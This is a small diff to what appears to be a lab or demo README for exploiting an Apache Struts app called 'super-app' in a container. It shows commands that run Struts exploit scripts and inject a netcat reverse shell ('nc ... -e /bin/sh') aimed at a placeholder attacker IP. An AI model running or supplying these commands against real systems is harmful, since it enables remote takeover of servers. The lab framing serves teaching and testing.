@@ -20,7 +20,7 @@ To access the super-app website, also use the service IP address on port 8080/su
 Use the IP address from the website with the python scripts to inject a netcat command and sh command to establish a reverse shell from the container.
 
 **struts1.py example**: (see if it's exploitable)
-`python3 struts1.py http://xxx.xxx.xxx.xxx:8080/super-app/orders/3 id
+`python3 struts1.py http://xxx.xxx.xxx.xxx:8080/super-app/orders/3 id`
 
 **struts-pwn2.py example:** (insert your own IP addresses / port for the reverse shell)
 `python struts-pwn2.py --exploit --url 'http://xxx.xxx.xxx.xxx:8080/super-app/orders/3' -c 'nc -nv 123.456.789.100 1337 -e /bin/sh'`
